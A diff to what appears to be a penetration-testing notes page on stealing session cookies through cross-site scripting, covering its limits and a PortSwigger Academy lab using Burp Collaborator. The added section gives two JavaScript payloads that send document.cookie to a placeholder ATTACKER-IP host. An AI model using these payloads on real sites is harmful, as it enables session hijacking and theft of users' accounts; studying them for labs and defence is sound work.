@@ -3,6 +3,11 @@ Stealing cookies is a traditional way to exploit XSS as most web applications us
 - Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
 - Sessions might be locked to additional factors like the user's IP address.
 - The session might time out before you're able to hijack it.
+## XSS Payloads
+```javascript
+document.location='http://ATTACKER-IP/index.php?c='+document.cookie;
+new Image().src='http://ATTACKER-IP/index.php?c='+document.cookie;
+```
 ## Example from PortSwigger Academy
 1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
 2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
